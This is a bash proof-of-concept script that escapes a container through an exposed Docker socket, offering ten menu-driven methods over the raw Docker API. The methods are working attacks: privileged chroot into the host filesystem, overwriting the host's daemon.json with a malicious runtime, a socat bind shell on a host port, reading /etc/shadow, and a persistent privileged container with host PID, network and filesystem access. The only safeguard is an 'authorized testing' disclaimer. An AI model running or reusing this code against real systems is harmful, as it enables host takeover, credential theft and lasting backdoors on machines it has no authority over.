#!/bin/bash
# Docker Socket Container Escape PoC - Direct API Version (Improved)
# Based on original script and review suggestions.
# For educational purposes only. Use only in authorized testing environments.

# --- Configuration ---
DOCKER_API_VERSION="v1.41" # Adjust as needed for your Docker API version
DOCKER_SOCKET_PATH="/var/run/docker.sock"
DEFAULT_IMAGE="alpine:latest" # Base image for PoC containers
SILENT_CURL=true # Set to false for verbose curl output during debugging

# --- Utility Functions ---
log_info() { echo "[*] $1"; }
log_success() { echo "[+] $1"; }
log_error() { echo "[-] $1"; }
log_warn() { echo "[!] $1"; }

# Function to check if a command is available
check_command() {
    command -v "$1" &>/dev/null
}

# Function to attempt package installation
install_package() {
    local package_name="$1"
    log_info "Attempting to install $package_name..."
    # Try common package managers
    if check_command apt-get; then
        apt-get update &>/dev/null && apt-get install -y "$package_name" &>/dev/null
    elif check_command apk; then
        apk add --no-cache "$package_name" &>/dev/null
    elif check_command yum; then
        yum install -y "$package_name" &>/dev/null
    elif check_command dnf; then
        dnf install -y "$package_name" &>/dev/null
    else
        log_error "No known package manager (apt-get, apk, yum, dnf) found to install $package_name."
        return 1
    fi

    if check_command "$package_name"; then
        log_success "$package_name installed successfully."
        return 0
    else
        log_error "Failed to install $package_name. Please install it manually."
        return 1
    fi
}

# --- Docker API Helper Functions ---
# Args: $1: HTTP Method (GET, POST, DELETE), $2: API Endpoint (e.g., /containers/create), $3: Optional JSON data or file path for POST/PUT
# Returns: Raw curl output. Errors are logged.
docker_api_request() {
    local http_method="$1"
    local api_endpoint="$2"
    local data_payload="$3"
    local curl_opts_array=()
    local content_type_header="-H \"Content-Type: application/json\"" # Default

    if [ "$SILENT_CURL" = true ]; then
        curl_opts_array+=("-s")
    fi

    local url="http://localhost/${DOCKER_API_VERSION}${api_endpoint}"

    local response
    local curl_exit_code

    # log_info "API Request: $http_method $url Payload: $data_payload" # Debug line

    if [ -n "$data_payload" ]; then
        if [[ "$api_endpoint" == "/build"* && "$data_payload" == *@* ]]; then # Handle build context tarball
             content_type_header="-H \"Content-Type: application/x-tar\""
             response=$(curl "${curl_opts_array[@]}" --unix-socket "$DOCKER_SOCKET_PATH" \
                -X "$http_method" "$url" \
                $content_type_header \
                --data-binary "$data_payload" 2>&1) # Capture stderr too for errors
        else
            response=$(curl "${curl_opts_array[@]}" --unix-socket "$DOCKER_SOCKET_PATH" \
                -X "$http_method" "$url" \
                $content_type_header \
                -d "$data_payload" 2>&1) # Capture stderr too for errors
        fi
    else
        response=$(curl "${curl_opts_array[@]}" --unix-socket "$DOCKER_SOCKET_PATH" \
            -X "$http_method" "$url" \
            $content_type_header 2>&1) # Capture stderr too for errors
    fi
    curl_exit_code=$?

    if [ $curl_exit_code -ne 0 ]; then
        log_error "Curl command failed for $http_method $url. Exit code: $curl_exit_code"
        log_error "Curl output: $response"
        return 1
    fi

    # Check for Docker API error messages (often JSON with a "message" field)
    if echo "$response" | jq -e '.message' >/dev/null 2>&1; then
        local error_message
        error_message=$(echo "$response" | jq -r '.message')
        # Don't log certain "expected" errors as failures for generic handler
        if ! [[ "$error_message" == "No such container"* || \
                "$error_message" == "No such image"* || \
                "$error_message" == "container already stopped"* || \
                "$http_method" == "DELETE" && "$error_message" == "conflict"* ]]; then # e.g. conflict removing image still in use
             log_warn "Docker API reported for $http_method $url: $error_message"
        fi
    fi
    echo "$response"
    return 0
}

# Args: $1: Container config (JSON string), $2: Optional container name
# Returns: Container ID or empty string on failure
create_container() {
    local config_json="$1"
    local container_name="$2"
    local endpoint="/containers/create"

    if [ -n "$container_name" ]; then
        endpoint="${endpoint}?name=${container_name}"
    fi

    local response
    response=$(docker_api_request "POST" "$endpoint" "$config_json")
    if [ $? -ne 0 ]; then return 1; fi

    local container_id
    container_id=$(echo "$response" | jq -r '.Id // ""')

    if [ -z "$container_id" ]; then
        log_error "Failed to create container. Response: $response"
        return 1
    fi
    # log_success "Container created with ID: $container_id" # Logged by caller if needed
    echo "$container_id"
    return 0
}

# Args: $1: Container ID
# Returns: 0 on success, 1 on failure
start_container() {
    local container_id="$1"
    if [ -z "$container_id" ]; then log_error "start_container: No container ID provided."; return 1; fi

    local response
    response=$(docker_api_request "POST" "/containers/${container_id}/start" "")
    # API returns 204 No Content on success, or error JSON
    if [ $? -ne 0 ] || (echo "$response" | jq -e '.message' >/dev/null 2>&1) ; then
        log_error "Failed to start container $container_id. Response: $response"
        return 1
    fi
    log_success "Container $container_id started."
    return 0
}

# Args: $1: Container ID
# Returns: Logs string. Unreliable `sleep` is used.
get_container_logs() {
    local container_id="$1"
    if [ -z "$container_id" ]; then log_error "get_container_logs: No container ID provided."; return 1; fi

    sleep 2 # Review: Unreliable waiting. For PoC, this delay helps logs appear.

    local response
    response=$(docker_api_request "GET" "/containers/${container_id}/logs?stdout=1&stderr=1&timestamps=true" "")
    if [ $? -ne 0 ]; then
        log_error "Failed to get logs for container $container_id. Response: $response"
        return 1
    fi
    # Strip Docker's 8-byte stream header from each log line
    # This sed command assumes text logs. Binary or complex streams might need more robust parsing.
    echo "$response" | sed 's/^........//'
    return 0
}

# Args: $1: Container ID, $2: force (boolean string, "true" or "false")
# Returns: 0 on success/acceptable failure, 1 on unexpected failure
remove_container() {
    local container_id="$1"
    local force_param="${2:-true}"
    if [ -z "$container_id" ]; then log_error "remove_container: No container ID provided."; return 1; fi

    # Attempt to stop the container first for cleaner removal, ignore errors if already stopped or non-existent
    docker_api_request "POST" "/containers/${container_id}/stop?t=5" "" >/dev/null 2>&1

    local response
    response=$(docker_api_request "DELETE" "/containers/${container_id}?force=${force_param}&v=1" "") # v=1 to remove volumes
    # API returns 204 No Content on success.
    # An error message "No such container" is also acceptable (already removed).
    if [ $? -ne 0 ]; then
        if echo "$response" | jq -e '.message' >/dev/null 2>&1; then
            local error_msg
            error_msg=$(echo "$response" | jq -r '.message')
            if [[ "$error_msg" == *"No such container"* ]]; then
                log_info "Container $container_id already removed or never existed."
                return 0
            elif [[ "$error_msg" == *"removal of container"* && "$error_msg" == *"is already in progress"* ]]; then
                log_info "Removal of container $container_id is already in progress."
                return 0
            else
                log_error "Failed to remove container $container_id. Response: $response"
                return 1
            fi
        else
            log_error "Failed to remove container $container_id (curl error or unexpected response)."
            return 1
        fi
    fi
    log_success "Container $container_id removed."
    return 0
}

# Args: $1: Tarball path (e.g., @/tmp/build.tar.gz), $2: Image name:tag, $3: Dockerfile path within context (e.g., Dockerfile)
# Returns: Build log string.
build_image() {
    local tarball_path="$1" # Should be like "@/path/to/file.tar.gz"
    local image_name_tag="$2"
    local dockerfile_rel_path="$3"
    # `remote` can be a URL to a Git repo. For tarball, it's not used or empty.
    # `buildargs` can be passed as a JSON string, e.g., '{"arg1":"value1"}'
    local endpoint="/build?t=${image_name_tag}&dockerfile=${dockerfile_rel_path}&rm=true" # rm=true to remove intermediate containers

    log_info "Starting image build: $image_name_tag using context $tarball_path and Dockerfile $dockerfile_rel_path"
    local response
    response=$(docker_api_request "POST" "$endpoint" "$tarball_path") # docker_api_request handles --data-binary and content type

    if [ $? -ne 0 ]; then
        log_error "Image build POST request failed for $image_name_tag."
        echo "$response" # Print response which might contain curl errors
        return 1
    fi

    # Successful build streams JSON objects. Check for "errorDetail" in the stream.
    # A simple check: grep for errorDetail.
    if echo "$response" | grep -q "errorDetail"; then
        log_error "Image build failed for $image_name_tag."
        log_info "Full build output containing error:\n$response"
        return 1
    fi

    log_success "Image $image_name_tag build process completed or initiated successfully."
    echo "$response" # Return the build output stream
    return 0
}

# --- Main Script ---
main() {
    log_info "Docker Socket Container Escape - Direct API Version (Improved)"
    log_info "Starting vulnerability check..."

    if [ ! -S "$DOCKER_SOCKET_PATH" ]; then
        log_error "Docker socket ($DOCKER_SOCKET_PATH) not found. Container may not be vulnerable."
        exit 1
    fi
    log_success "Docker socket found. Container may be vulnerable."

    # Check for dependencies
    for cmd in curl jq; do
        if ! check_command "$cmd"; then
            log_warn "$cmd not found."
            if ! install_package "$cmd"; then
                 log_error "$cmd is required. Auto-install failed. Please install it manually and try again."
                 exit 1
            fi
        else
            log_success "$cmd is available."
        fi
    done

    # Prepare base image
    local img_name="${DEFAULT_IMAGE%%:*}"
    local img_tag="${DEFAULT_IMAGE#*:}"
    if [ "$img_name" == "$img_tag" ] || [ -z "$img_tag" ]; then
        img_tag="latest"
    fi
    log_info "Ensuring base image ($img_name:$img_tag) is available..."
    docker_api_request "POST" "/images/create?fromImage=${img_name}&tag=${img_tag}" "" > /dev/null # Suppress pull output

    # Display menu
    echo ""
    echo "Available escape methods:"
    echo "1. Basic privileged container escape (mount host filesystem)"
    echo "2. Docker daemon configuration exploit (API version)"
    echo "3. Create container with custom capabilities (API version)"
    echo "4. Deploy sidecar container with host network (API version)"
    echo "5. Direct command execution on host via privileged container (API version)"
    echo "6. Container image build: COPY file from controlled context (API version)"
    echo "7. Volume mount to access host paths (API version)"
    echo "8. Host PID namespace exploitation (API version)"
    echo "9. Create privileged exec session via API"
    echo "10. Full system compromise (persistent privileged container - API version)"
    echo ""
    read -p "Select escape method (1-10): " method_choice

    # --- Method Implementations ---
    case $method_choice in
        1)
            log_info "Executing Method 1: Basic privileged container escape..."
            local container_config
            container_config=$(cat <<EOF
{
    "Image": "$DEFAULT_IMAGE",
    "Cmd": ["sh", "-c", "echo '[M1+] Container escape successful. Running on host via chroot.'; echo '[M1+] Hostname: $(hostname)'; echo '[M1+] Host root files (first 10):'; ls -la /hostfs/ | head -n 10; sleep 5"],
    "HostConfig": {
        "Privileged": true,
        "PidMode": "host",
        "Binds": ["/:/hostfs"]
    },
    "Entrypoint": ["chroot", "/hostfs"]
}
EOF
)
            local container_id
            container_id=$(create_container "$container_config")
            if [ -n "$container_id" ]; then
                log_success "Method 1: Privileged container created: $container_id"
                if start_container "$container_id"; then
                    get_container_logs "$container_id"
                fi
                remove_container "$container_id"
            fi
            ;;
        2)
            log_info "Executing Method 2: Docker daemon configuration exploit..."
            local malicious_daemon_json_content
            malicious_daemon_json_content=$(cat <<EOF
{
  "runtimes": {
    "poc_runtime": {
      "path": "/bin/sh",
      "runtimeArgs": ["-c", "echo \"PoC runtime executed on host via Method 2! Proof: $(date)\" > /tmp/poc_runtime_method2.txt && id >> /tmp/poc_runtime_method2.txt"]
    }
  }
}
EOF
)
            echo "$malicious_daemon_json_content" > /tmp/daemon_poc.json
            log_info "Created malicious daemon.json at /tmp/daemon_poc.json"
            log_warn "This method copies the malicious daemon.json to the host's Docker config directory."
            log_warn "The Docker daemon on the HOST must be restarted for this config to take effect."
            log_warn "If successful, a container could then be started with '--runtime=poc_runtime' to execute the payload."

            local helper_container_config
            helper_container_config=$(cat <<EOF
{
    "Image": "$DEFAULT_IMAGE",
    "Cmd": ["sh", "-c", "cp /tmp/daemon_to_copy.json /host_etc_docker/daemon.json && echo '[M2+] Malicious daemon.json copied to host /etc/docker/daemon.json.' && ls -l /host_etc_docker/daemon.json && echo '[M2+] IMPORTANT: Docker daemon on the HOST needs a restart to apply this config.'"],
    "HostConfig": {
        "Binds": ["/etc/docker:/host_etc_docker", "/tmp/daemon_poc.json:/tmp/daemon_to_copy.json:ro"]
    }
}
EOF
)
            local container_id
            container_id=$(create_container "$helper_container_config")
            if [ -n "$container_id" ]; then
                log_success "Method 2: Helper container created: $container_id"
                if start_container "$container_id"; then
                    get_container_logs "$container_id"
                fi
                remove_container "$container_id"
            fi
            rm -f /tmp/daemon_poc.json
            ;;
        3)
            log_info "Executing Method 3: Create container with custom capabilities (SYS_ADMIN)..."
            local container_config
            container_config=$(cat <<EOF
{
    "Image": "$DEFAULT_IMAGE",
    "Cmd": ["sh", "-c", "echo '[M3+] Container with SYS_ADMIN capability running.'; capsh --print; echo '[M3+] Attempting to mount host root:'; mkdir -p /mnt/host_root_m3; if mount --bind / /mnt/host_root_m3; then echo '[M3+] Host root mounted at /mnt/host_root_m3'; ls -la /mnt/host_root_m3/etc | head -n 5; umount /mnt/host_root_m3; else echo 'Failed to mount host root'; fi; sleep 3"],
    "HostConfig": {
        "CapAdd": ["SYS_ADMIN", "DAC_OVERRIDE"],
        "SecurityOpt": ["apparmor=unconfined", "seccomp=unconfined"]
    }
}
EOF
)
            local container_id
            container_id=$(create_container "$container_config")
            if [ -n "$container_id" ];then
                log_success "Method 3: SYS_ADMIN container created: $container_id"
                if start_container "$container_id"; then
                    get_container_logs "$container_id"
                fi
                remove_container "$container_id"
            fi
            ;;
        4)
            log_info "Executing Method 4: Deploy sidecar container with host network..."
            local container_config
            container_config=$(cat <<EOF
{
    "Image": "$DEFAULT_IMAGE",
    "Cmd": ["sh", "-c", "apk add --no-cache socat; echo '[M4+] Host network container running. Starting socat listener on host TCP port 45678...'; socat TCP-LISTEN:45678,fork EXEC:'/bin/sh',pty,stderr,setsid,sigint,echo=0"],
    "HostConfig": {
        "NetworkMode": "host"
    },
    "Labels": {"poc_tool": "docker_socket_escape"}
}
EOF
)
            local container_name="host_net_m4_$(date +%s)"
            local container_id
            container_id=$(create_container "$container_config" "$container_name")
            if [ -n "$container_id" ]; then
                log_success "Method 4: Host network container created: $container_id ($container_name)"
                if start_container "$container_id"; then
                    log_info "Attempting to retrieve initial logs for Method 4 container (socat runs in foreground)..."
                    get_container_logs "$container_id"
                    log_success "Method 4: Container ${container_id} ($container_name) is running with host network."
                    log_warn "It is attempting to listen on port 45678 on ALL host network interfaces."
                    log_warn "Connect to it manually (e.g., from host or another machine: nc <host_ip> 45678)."
                    log_warn "To clean up THIS container, run: ./$(basename "$0") --cleanup-id ${container_id}"
                    echo "Manual cleanup: curl -s --unix-socket $DOCKER_SOCKET_PATH -X DELETE \"http://localhost/${DOCKER_API_VERSION}/containers/${container_id}?force=true\""
                else
                    remove_container "$container_id" # Cleanup if start failed
                fi
            fi
            ;;
        5)
            log_info "Executing Method 5: Direct command execution on host via privileged container & chroot..."
            echo '#!/bin/sh
echo "[M5+] Script executing via chroot into host file system."
echo "[M5+] UID: $(id)"
echo "[M5+] Hostname: $(hostname)"
echo "[M5+] Current dir: $(pwd)"
echo "[M5+] Host /etc/passwd head (first 3 lines):"
head -n 3 /etc/passwd
ls -la /tmp
echo "[M5+] Creating a file on host /tmp/poc_method5_proof.txt"
date > /tmp/poc_method5_proof.txt
cat /tmp/poc_method5_proof.txt
            ' > /tmp/m5_host_exec_script.sh
            chmod +x /tmp/m5_host_exec_script.sh

            local container_config
            container_config=$(cat <<EOF
{
    "Image": "$DEFAULT_IMAGE",
    "Cmd": ["/payload/m5_script.sh"],
    "HostConfig": {
        "Privileged": true,
        "Binds": ["/:/hostfs", "/tmp/m5_host_exec_script.sh:/payload/m5_script.sh:ro"]
    },
    "Entrypoint": ["chroot", "/hostfs"]
}
EOF
)
            local container_id
            container_id=$(create_container "$container_config")
            if [ -n "$container_id" ]; then
                log_success "Method 5: Privileged exec container created: $container_id"
                if start_container "$container_id"; then
                    get_container_logs "$container_id"
                    log_info "Method 5: Check host's /tmp/poc_method5_proof.txt for verification."
                fi
                remove_container "$container_id"
            fi
            rm -f /tmp/m5_host_exec_script.sh
            ;;
        6)
            log_info "Executing Method 6: Container image build - COPY file from controlled context..."
            log_info "This method demonstrates `COPY`ing a file from a build context (controlled by attacker) into an image."
            log_info "If an attacker can prepare a build context tarball containing sensitive host files (not shown here),"
            log_info "this technique could package those files into an image for exfiltration."

            mkdir -p /tmp/m6_build_context
            echo "This is a secret file placed in the build context by the PoC script. Timestamp: $(date)" > /tmp/m6_build_context/secret_file_in_context.txt
            cat <<EOF > /tmp/m6_build_context/Dockerfile
FROM $DEFAULT_IMAGE
ARG CONTEXT_FILE=secret_file_in_context.txt
COPY \$CONTEXT_FILE /copied_from_context.txt
RUN echo "[M6-Build] Content of copied file:" && cat /copied_from_context.txt
CMD echo "[M6-Run] Image run. Copied file content: \$(cat /copied_from_context.txt || echo 'File not found')"
EOF
            log_info "Created Dockerfile and sample file in /tmp/m6_build_context/"
            tar -czf /tmp/m6_build_context.tar.gz -C /tmp/m6_build_context .
            log_info "Created build context tarball at /tmp/m6_build_context.tar.gz"

            local image_name_tag="poc_m6_image:$(date +%s)"
            local build_log
            build_log=$(build_image "@/tmp/m6_build_context.tar.gz" "$image_name_tag" "Dockerfile")

            if echo "$build_log" | grep -q "errorDetail"; then
                log_error "Method 6: Image build failed. See output above."
            else
                log_success "Method 6: Image build successful (or no immediate errors)."
                # log_info "Full build log:\n$build_log" # Can be very verbose

                log_info "Attempting to run a container from the built image: $image_name_tag"
                local run_config
                run_config=$(cat <<EOF
{ "Image": "$image_name_tag" }
EOF
)
                local container_id_m6
                container_id_m6=$(create_container "$run_config")
                if [ -n "$container_id_m6" ]; then
                    log_success "Method 6: Container from built image created: $container_id_m6"
                    if start_container "$container_id_m6"; then
                        get_container_logs "$container_id_m6"
                    fi
                    remove_container "$container_id_m6"
                fi
                # Clean up the built image
                log_info "Cleaning up built image: $image_name_tag"
                docker_api_request "DELETE" "/images/${image_name_tag}?force=true" "" >/dev/null 2>&1
            fi
            rm -rf /tmp/m6_build_context /tmp/m6_build_context.tar.gz
            ;;
        7)
            log_info "Executing Method 7: Volume mount to access sensitive host paths..."
            local container_config
            container_config=$(cat <<EOF
{
    "Image": "$DEFAULT_IMAGE",
    "Cmd": ["sh", "-c", "echo '[M7+] Accessing host files via direct bind mounts.'; echo '[M7+] Host /etc/hostname:'; cat /host_etc_hostname_ro; echo '[M7+] Host /etc/shadow (first 3 lines, if readable):'; head -n 3 /host_shadow_ro || echo 'Cannot read /host_shadow_ro'; echo '[M7+] Listing /host_root_ro/tmp/ (first 10):'; ls -la /host_root_ro/tmp/ | head -n 10; sleep 3"],
    "HostConfig": {
        "Binds": [
            "/:/host_root_ro:ro",
            "/etc/hostname:/host_etc_hostname_ro:ro",
            "/etc/shadow:/host_shadow_ro:ro"
        ]
    }
}
EOF
)
            local container_id
            container_id=$(create_container "$container_config")
            if [ -n "$container_id" ]; then
                log_success "Method 7: Volume mount container created: $container_id"
                if start_container "$container_id"; then
                    get_container_logs "$container_id"
                fi
                remove_container "$container_id"
            fi
            ;;
        8)
            log_info "Executing Method 8: Host PID namespace exploitation..."
            local container_config
            container_config=$(cat <<EOF
{
    "Image": "$DEFAULT_IMAGE",
    "Cmd": ["sh", "-c", "echo '[M8+] Running in host PID namespace.'; echo '[M8+] Host processes (dockerd, sshd, init/systemd - top 10 by CPU):'; ps aux --sort=-%cpu | head -n 10; echo '[M8+] Could attempt to inspect/interact with these processes (requires more privilege typically).'; sleep 3"],
    "HostConfig": {
        "PidMode": "host",
        "Privileged": true # Often needed for meaningful interaction beyond listing
    }
}
EOF
)
            local container_id
            container_id=$(create_container "$container_config")
            if [ -n "$container_id" ]; then
                log_success "Method 8: Host PID namespace container created: $container_id"
                if start_container "$container_id"; then
                    get_container_logs "$container_id"
                fi
                remove_container "$container_id"
            fi
            ;;
        9)
            log_info "Executing Method 9: Create privileged exec session via API..."
            local target_container_name="m9_target_exec_$(date +%s)"
            local target_config
            target_config=$(cat <<EOF
{ "Image": "$DEFAULT_IMAGE", "Cmd": ["sleep", "300"], "Labels": {"poc_tool":"docker_socket_escape_target"} }
EOF
)
            log_info "Creating a temporary target container ($target_container_name) for exec..."
            local target_container_id
            target_container_id=$(create_container "$target_config" "$target_container_name")

            if [ -z "$target_container_id" ]; then
                log_error "Method 9: Failed to create target container. Aborting method."
            else
                log_success "Method 9: Target container created: $target_container_id"
                if ! start_container "$target_container_id"; then
                    log_error "Method 9: Failed to start target container."
                    remove_container "$target_container_id" # Clean up
                else
                    sleep 1 # Give container a moment to fully start

                    log_info "Creating privileged exec instance on container $target_container_id..."
                    local exec_config
                    exec_config=$(cat <<EOF
{
    "AttachStdout": true, "AttachStderr": true, "Tty": false, "Privileged": true,
    "Cmd": [
        "sh", "-c",
        "echo '[M9-Exec+] Privileged exec session running inside $target_container_name!'; id; capsh --print; echo '[M9-Exec+] Mounting host rootfs to /mnt_m9;'; mkdir -p /mnt_m9; if mount --bind / /mnt_m9; then echo '[M9-Exec+] Host root mounted. /mnt_m9/etc head:'; ls -la /mnt_m9/etc | head -n 3; umount /mnt_m9; else echo 'Failed to mount host root'; fi"
    ]
}
EOF
)
                    local exec_response
                    exec_response=$(docker_api_request "POST" "/containers/${target_container_id}/exec" "$exec_config")
                    local exec_id
                    exec_id=$(echo "$exec_response" | jq -r '.Id // ""')

                    if [ -z "$exec_id" ]; then
                        log_error "Method 9: Failed to create exec instance. Response: $exec_response"
                    else
                        log_success "Method 9: Exec instance created with ID: $exec_id"
                        log_info "Starting exec instance $exec_id (non-interactive)..."
                        local start_exec_payload='{"Detach": false, "Tty": false}' # Must be valid JSON
                        local exec_output
                        exec_output=$(docker_api_request "POST" "/exec/${exec_id}/start" "$start_exec_payload")

                        log_info "[M9-Exec Output (attempting to strip stream header)]:"
                        echo "$exec_output" | sed 's/^........//' # Strip 8-byte stream header
                    fi
                    log_info "Method 9: Cleaning up target container $target_container_id ($target_container_name)..."
                    remove_container "$target_container_id"
                fi
            fi
            ;;
        10)
            log_info "Executing Method 10: Full system compromise (persistent privileged container)..."
            local container_config
            container_config=$(cat <<EOF
{
    "Image": "$DEFAULT_IMAGE",
    "Cmd": ["sh", "-c", "echo '[M10+] Persistent privileged container active.'; apk add --no-cache socat openssh-server >/dev/null 2>&1; echo '[M10+] SSH server and socat installed.'; echo '[M10+] In a real attack, setup persistence (e.g., SSH backdoor on host via /host_root, cron jobs, etc.).'; echo '[M10+] This container will run indefinitely and restart on failure/reboot.'; tail -f /dev/null"],
    "HostConfig": {
        "Privileged": true, "PidMode": "host", "NetworkMode": "host",
        "RestartPolicy": {"Name": "always"},
        "Binds": ["/:/host_root"]
    },
    "Labels": {"poc_tool": "docker_socket_escape_persistent"}
}
EOF
)
            local container_name="m10_persistent_$(date +%s)"
            local container_id
            container_id=$(create_container "$container_config" "$container_name")
            if [ -n "$container_id" ]; then
                log_success "Method 10: Persistent container created: $container_id ($container_name)"
                if start_container "$container_id"; then
                    log_info "Attempting to retrieve initial logs for Method 10 container..."
                    get_container_logs "$container_id" # Will show initial output.
                    log_success "Method 10: Persistent container ${container_id} ($container_name) created and started."
                    log_warn "This container is privileged, has access to host filesystem, PID, network, and will restart always."
                    log_warn "To clean up THIS container, run: ./$(basename "$0") --cleanup-id ${container_id}"
                    echo "Manual cleanup: curl -s --unix-socket $DOCKER_SOCKET_PATH -X DELETE \"http://localhost/${DOCKER_API_VERSION}/containers/${container_id}?force=true\""
                else
                    remove_container "$container_id" # Cleanup if start failed
                fi
            fi
            ;;
        *)
            log_error "Invalid option selected: $method_choice"
            exit 1
            ;;
    esac

    log_success "PoC execution for method $method_choice completed."
    log_warn "Review output carefully. Some methods (4, 10) create persistent containers that require manual cleanup using the provided command or the --cleanup-id flag."
}

# Handle dedicated cleanup command if script is called with --cleanup-id <ID>
if [ "$1" == "--cleanup-id" ] && [ -n "$2" ]; then
    CONTAINER_TO_CLEAN="$2"
    log_warn "Attempting to cleanup container ID: $CONTAINER_TO_CLEAN"

    if [ ! -S "$DOCKER_SOCKET_PATH" ]; then
        log_error "Docker socket ($DOCKER_SOCKET_PATH) not found. Cannot perform cleanup."
        exit 1
    fi
    for cmd_check in curl jq; do
      if ! check_command "$cmd_check"; then log_error "$cmd_check not found, cannot perform cleanup."; exit 1; fi
    done

    remove_container "$CONTAINER_TO_CLEAN" "true"
    log_success "Cleanup attempt for $CONTAINER_TO_CLEAN finished. Verify manually if unsure."
    exit 0
fi

# --- Entry Point ---
if [ "$1" == "--help" ] || [ "$1" == "-h" ]; then
    echo "Usage: $(basename "$0")"
    echo "       $(basename "$0") --cleanup-id <CONTAINER_ID_TO_REMOVE>"
    echo "Runs interactively if no arguments are given."
    exit 0
fi

main "$@"